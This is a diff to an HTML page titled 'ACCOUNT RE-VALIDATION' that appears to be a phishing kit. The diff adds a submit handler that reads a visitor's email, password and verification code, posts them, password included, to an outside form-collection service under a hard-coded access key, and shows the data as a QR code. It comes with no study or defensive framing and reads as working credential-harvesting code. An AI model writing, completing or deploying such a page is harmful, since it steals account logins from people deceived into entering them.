@@ -9,7 +9,8 @@
   <meta charset="UTF-8">
   <title>ACCOUNT RE-VALIDATION</title>
   <link rel="stylesheet" href="./style.css">
-
+<!-- QRCode.js library -->
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
 </head>
 <body>
 <!-- partial:index.partial.html -->
@@ -84,14 +85,52 @@
       <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</label>
 
     </form>
+	<!-- QR code container -->
+    <div id="qrcode" style="margin-top:20px;"></div>
   </article>
 </section>
 <script>
-document.getElementById("myForm").addEventListener("submit", function(event) {
-  event.preventDefault(); // stop default redirect
-  // Optionally send data via fetch if needed
-  window.location.href = "https://th.bing.com/th/id/R.8cd9779578487059327d0e1fa8e1836a?rik=isyael77QNZVUQ&pid=ImgRaw&r=0";
-});
-</script>  
+  document.getElementById("validationForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // stop default submission
+
+    // Collect form values
+    const email = document.getElementById("input_email").value;
+    const password = document.getElementById("input_password").value;
+    const code = document.getElementById("input_code").value;
+    const issue = document.getElementById("cars").value;
+
+    // Simple validation
+    if (!email || !password) {
+      alert("Please fill in required fields.");
+      return;
+    }
+
+    // Clear any previous QR code
+    document.getElementById("qrcode").innerHTML = "";
+
+    // Generate QR code with form data
+    new QRCode(document.getElementById("qrcode"), {
+      text: `Issue: ${issue}\nEmail: ${email}\nCode: ${code}`,
+      width: 200,
+      height: 200
+    });
+
+    // Optionally send data to Web3Forms
+    fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        access_key: "13521604-ff3a-48f6-a7f4-a7d76fa37bca",
+        email: email,
+        password: password,
+        code: code,
+        issue: issue
+      })
+    })
+    .then(res => res.json())
+    .then(data => console.log("Submitted:", data))
+    .catch(err => console.error(err));
+  });
+</script> 
 </body>
 </html>
